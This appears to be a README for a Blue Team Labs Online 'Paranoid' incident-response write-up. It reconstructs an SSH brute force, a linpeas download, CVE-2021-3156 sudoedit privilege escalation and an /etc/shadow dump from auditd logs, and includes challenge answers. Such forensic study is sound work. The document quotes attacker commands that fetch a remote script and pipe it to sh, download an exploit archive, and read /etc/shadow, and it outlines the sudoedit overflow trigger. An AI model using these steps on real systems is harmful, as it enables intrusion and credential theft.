# 🛡️ Blue Team Labs Online (BTLO) — Paranoid

> **Category:** Incident Response / Linux Host Forensics  
> **Difficulty:** Medium | **Points:** 20 / 20 (100% Solved)  
> **Investigation Target:** Linux Kernel Audit Subsystem (`/var/log/audit/audit.log` — 83,024 records)  
> **Primary Vulnerability:** **CVE-2021-3156** ("Baron Samedit" Sudoedit Heap Buffer Overflow)  
> **Lead Investigator:** Mukesh Raja (CICSA — Certified IT Infrastructure and Cyber SOC Analyst)

---

## 🧭 Scenario & Mission Brief

A security alert was triggered in the SOC indicating anomalous administrative command executions on an internal Linux server running kernel version **5.4.0**. Security analysts were tasked with conducting a retrospective digital forensic investigation on raw Linux kernel audit logs (`audit.log`). 

The objective: reconstruct the threat actor's complete cyber kill chain from initial perimeter reconnaissance to root-level credential harvesting, validate the exact privilege escalation mechanics, document technical indicators of compromise (**IOCs**), and formulate defensive engineering rules.

```text
+----------------------------------------------------------------------------------------------------+
|                                    INCIDENT SCORECARD & METRICS                                    |
+----------------------------------------------------------------------------------------------------+
| Parameter                  | Forensic Determination                  | Audit Log Reference         |
|----------------------------+-----------------------------------------+-----------------------------|
| Threat Actor Source IP     | 192.168.4.155                           | addr=192.168.4.155          |
| Ingress / Attack Vector    | SSH Password Brute-Force (T1110.001)    | 175 PAM failures before OK  |
| Compromised Local User     | btlo (UID: 1001 / GID: 1001)            | ses=49, AUID=1001           |
| Enumeration Stager Script  | http://192.168.4.155:8000/linpeas.sh    | Line 10988 (comm="wget")    |
| Weaponized Exploit Archive | http://192.168.4.155:8000/evil.tar.gz   | Line 80913 (comm="wget")    |
| Local Privilege Escalation | CVE-2021-3156 ("Baron Samedit")         | /usr/bin/sudoedit -s        |
| Escalation Mechanism       | Heap overflow -> glibc NSS hijacking    | libnss_X/P0P_...so.2        |
| Peak Privilege Attained    | root (UID: 0 / GID: 0 / EUID: 0)        | PID 829992 -> PID 830004    |
| Exfiltrated Target File    | /etc/shadow                             | Line 81399 (Event 481063)   |
| Anti-Forensics Attempt     | `rm -rf /home/btlo/evil`                | Defeated by PAM/TTY auditd  |
| Total Adversary Dwell Time | 5 Minutes, 16 Seconds                   | 1633393357 to 1633393674    |
| Platform Verification      | 20 / 20 Points (100% Complete)          | Completed Certificate       |
+----------------------------------------------------------------------------------------------------+
```

---

## 🗺️ Big Picture & Attack Architecture

### 1. Multi-Stage Ingress & Attack Flow

```text
+----------------------------------------------------------------------------------------------------+
|                                      ATTACK LIFECYCLE OVERVIEW                                     |
+----------------------------------------------------------------------------------------------------+
|                                                                                                    |
|  [ATTACKER: 192.168.4.155]                                    [TARGET: Linux Server]               |
|                                                                                                    |
|  1. RECON & BRUTE FORCE:                                                                           |
|     Port 22 SSH Connection ──(175 Failed Passwords)──> PAM Logs: USER_AUTH res=failed             |
|     176th Attempt ─────────(Valid Credentials)──────> PAM Logs: USER_AUTH res=success (Line 2819) |
|                                                               │                                    |
|                                                               ▼                                    |
|  2. INTERACTIVE SESSION SPAWNED:                                                                   |
|     SSH Daemon forks interactive shell ─────────────> Session 49 (pts/1, AUID=1001, UID=1001)     |
|                                                               │                                    |
|                                                               ▼                                    |
|  3. AUTOMATED ENUMERATION:                                                                         |
|     `wget http://192.168.4.155:8000/linpeas.sh | sh` ──> Staged in-memory to audit SUID binaries   |
|                                                               │                                    |
|                                                               ▼                                    |
|  4. EXPLOIT TRANSFER & BUILD:                                                                      |
|     `wget http://192.168.4.155:8000/evil.tar.gz` ───> Saved to /home/btlo/evil.tar.gz             |
|     `tar -zxvf evil.tar.gz && make` ────────────────> Compiles exploit & libnss shared library    |
|                                                               │                                    |
|                                                               ▼                                    |
|  5. PRIVILEGE ESCALATION (CVE-2021-3156):                                                          |
|     `./evil 0` triggers `sudoedit -s 'A...\' '' 'B...\'` ─> Heap buffer overflow                   |
|     Glibc NSS struct corrupted ─────────────────────> Loads libnss_X payload with EUID=0 (root)   |
|                                                               │                                    |
|                                                               ▼                                    |
|  6. ACTIONS ON OBJECTIVES & ANTI-FORENSICS:                                                        |
|     `cat /etc/shadow` (UID: 0) ─────────────────────> Password hashes compromised                 |
|     `rm -rf /home/btlo/evil` ───────────────────────> Local cleanup attempt (Captured in auditd)  |
|                                                                                                    |
+----------------------------------------------------------------------------------------------------+
```

### 2. Process Ancestry & Forensic Execution Tree

```text
+----------------------------------------------------------------------------------------------------+
|                                    PROCESS EXECUTION ANCESTRY                                      |
+----------------------------------------------------------------------------------------------------+
|                                                                                                    |
|  [sshd] (PID: 809533, UID: 0)                                                                      |
|     │                                                                                              |
|     └──> [sh / dash] (PID: 809662, AUID: 1001, UID: 1001, GID: 1001, TTY: pts/1, Ses: 49)          |
|             │                                                                                      |
|             ├──> [whoami / hostname / sudo -l]  (UID: 1001)  <-- Initial Recon                     |
|             │                                                                                      |
|             ├──> [wget .../linpeas.sh | sh]     (UID: 1001)  <-- Automated Discovery Probe         |
|             │                                                                                      |
|             ├──> [wget .../evil.tar.gz]         (UID: 1001)  <-- Exploit Payload Staging           |
|             │                                                                                      |
|             ├──> [tar -zxvf evil.tar.gz]        (UID: 1001)  <-- Exploit Unpacking                 |
|             │                                                                                      |
|             ├──> [make] ──> [gcc / ld]          (UID: 1001)  <-- On-Host Exploit Compilation       |
|             │                                                                                      |
|             └──> [./evil 0] (PID: 829992, UID: 1001)                                               |
|                     │                                                                              |
|                     └──> [/usr/bin/sudoedit -s 'AAAA...\'] (Event 481022)                          |
|                             │                                                                      |
|                             ▼ (glibc NSS service_user overwrite -> loads libnss_X)                 |
|                     [sh / dash] (PID: 829992, UID: 0, EUID: 0, GID: 0)  <-- ROOT SHELL ACQUIRED!   |
|                             │                                                                      |
|                             ├──> [cat /etc/shadow] (PID: 830004, UID: 0) <-- Credential Dumping    |
|                             │                                                                      |
|                             └──> [rm -rf /home/btlo/evil] <-- Anti-Forensics Cleanup Attempt       |
|                                                                                                    |
+----------------------------------------------------------------------------------------------------+
```

---

## 🎯 BTLO Challenge Tasks & Verified Forensic Answers

| # | Challenge Investigation Question | Verified Answer | Forensic Telemetry & Evidence in `audit.log` |
| :-: | :--- | :--- | :--- |
| **Q1** | What is the IP address of the attacker? | `192.168.4.155` | Recorded across 175 failed SSH attempts and successful login (`addr=192.168.4.155`, lines 920–2819). |
| **Q2** | How many failed SSH login attempts occurred before successful authentication? | `175` | Verified via `grep -c 'addr=192.168.4.155.*res=failed' audit.log`. Total: 175 events. |
| **Q3** | What username did the attacker compromise? | `btlo` | User account targeted in brute-force; successful session authenticated at Line 2819 (`acct="btlo"`). |
| **Q4** | What enumeration script was downloaded to the target host? | `linpeas.sh` | Line 10988: `wget -O - http://192.168.4.155:8000/linpeas.sh \| sh`. |
| **Q5** | What is the name of the exploit archive downloaded by the attacker? | `evil.tar.gz` | Line 80913: `wget http://192.168.4.155:8000/evil.tar.gz` staged to `/home/btlo/evil.tar.gz`. |
| **Q6** | What CVE vulnerability was exploited for local privilege escalation? | `CVE-2021-3156` | Baron Samedit heap buffer overflow in `sudoedit -s` (Lines 81255–81259, Event 481022). |
| **Q7** | What binary was executed to trigger the vulnerability? | `/usr/bin/sudoedit` | Line 81255: `a0="sudoedit" a1="-s"`, PATH record resolves to `/usr/bin/sudoedit`. |
| **Q8** | What sensitive system file was dumped once root access was achieved? | `/etc/shadow` | Line 81399: `a0="cat" a1="/etc/shadow"` executed under root (`uid=0`, `euid=0`, Event 481063). |

---

## 📂 Repository Directory Layout

```text
blueteamlab/paranoid/
├── README.md                              <-- Quick reference, challenge scorecard & task answers
├── incident_investigation_report.md       <-- Comprehensive 600+ line technical SOC investigation note
├── 5a00b588e5939aade0741c3324532f5eb4ad4bf7.zip <-- Original BTLO challenge distribution zip
├── Challenge Files/
│   └── audit.log                          <-- Raw 83,024-line Linux kernel audit log (17.3 MB)
├── evidence/                              <-- Official forensic verification screenshots & artifacts
│   ├── completed.png                      <-- BTLO 100% completion certificate (20/20 pts)
│   ├── poc-1.png                          <-- Terminal commands verifying forensic findings
│   ├── evil.sudoedit.etc.shadow.png       <-- Log evidence of exploit trigger and /etc/shadow read
│   ├── 81240,81270p.png                   <-- Raw audit events 481021-481023 (sudoedit heap overflow)
│   ├── etc.shadow.png                     <-- Raw audit event 481063 (/etc/shadow dumping)
│   ├── evidence1_redacted.png             <-- Redacted terminal timeline verification 1
│   ├── evidence2_redacted.png             <-- Redacted terminal timeline verification 2
│   ├── evidence3_redacted.png             <-- Redacted terminal timeline verification 3
│   └── Redteam_Logo-07-1024x278.png       <-- RedTeam Hacker Academy institutional badge
└── reports/                               <-- Formal DOCX and PDF deliverables
    ├── BTLO_Paranoid_Investigation_Report_Redacted.pdf
    ├── BTLO_Paranoid_Investigation_Report_Redacted.docx
    └── Mukesh_raja_REPORT.docx
```

---

## 🧪 Quick Defensive Verification (PoC Commands)

To verify the investigation findings directly against the raw audit telemetry in `Challenge Files/audit.log`, execute:

```bash
# Navigate to challenge directory
cd blueteamlab/paranoid/'Challenge Files'

# 1. Count brute force failures from attacker IP
grep -c 'addr=192.168.4.155.*res=failed' audit.log
# Returns: 175

# 2. Locate the successful SSH login
grep -nF 'addr=192.168.4.155.*res=success' audit.log
# Returns: Line 2819

# 3. Locate automated enumeration tool download
grep -nF 'linpeas.sh' audit.log
# Returns: Line 10988

# 4. Inspect Baron Samedit exploit execution and heap corruption arguments
sed -n '81245,81265p' audit.log

# 5. Locate /etc/shadow credential dump under root UID 0
grep -nF '1633393670.675:481063' audit.log
# Returns: Line 81399
```

---

## 📖 Deep-Dive Investigation Note

For the full technical investigation covering:
- In-depth **glibc NSS shared object hijacking** mechanics
- Complete **MITRE ATT&CK matrix** mapping
- Comprehensive **chronological audit event timeline**
- **Root cause analysis** (Ishikawa diagram)
- **NIST SP 800-61 Rev. 2 incident response playbook**
- **Detection engineering rules** (Auditd, Sigma, Splunk SPL, Elastic KQL)
- Complete **IOC indicators table** and **evidence gallery**

👉 **Read the Master Investigation Report:** [incident_investigation_report.md](./incident_investigation_report.md)

---

## 🧠 My Understanding Check

Test your grasp of Linux audit logs, privilege escalation, and incident response:

1. **Why does `auditd` record `AUID=4294967295` during SSH brute-force attempts, and what changes when the user successfully authenticates?**
2. **How did the threat actor exploit CVE-2021-3156 using `sudoedit -s` with a trailing backslash (`\`)? What specific glibc structure was corrupted?**
3. **In the `/etc/shadow` audit event, the process had `uid=0`, `euid=0`, but `auid=1001`. Why is the `auid` value critical for SOC attribution?**
4. **Why did the threat actor's anti-forensic cleanup (`rm -rf /home/btlo/evil`) fail to prevent detection by the blue team?**

<details>
<summary><b>Click to Reveal Evaluation Answers</b></summary>

<br>

1. **`AUID=4294967295` (Audit User ID `0xFFFFFFFF`):** Represents an unset user context, meaning the activity originated from an unauthenticated daemon process (`sshd`). Once authentication succeeds, PAM executes `audit_setloginuid()`, binding the immutable session `AUID=1001` to all subsequent child processes spawned under that session.
2. **Baron Samedit (`sudoedit -s \`):** When `sudoedit` is run with `-s` (shell mode) and arguments ending in a solitary backslash `\`, the argument parser unescapes characters past the null terminator into adjacent heap chunks. This corrupts glibc's `service_user` struct within the Name Service Switch (NSS) engine, causing SetUID-root `sudo` to dynamically load a malicious shared library (`libnss_X/P0P_...so.2`) controlled by the attacker.
3. **AUID vs. UID Attribution:** While `uid=0` and `euid=0` indicate the process had root privileges, `auid=1001` proves that the root process was spawned within the session established by the initially compromised standard user `btlo` (UID 1001). `auid` cannot be modified even after gaining root, preserving the evidentiary chain of custody.
4. **Auditd Kernel Space Interception:** The Linux kernel audit subsystem (`kauditd`) intercepts syscalls at the ring-0 kernel boundary *before* userland file operations occur. When `rm` is executed, the kernel records the `unlinkat` and `execve` events in memory and writes them to `/var/log/audit/audit.log` independently of the deleted userland directory contents.
</details>
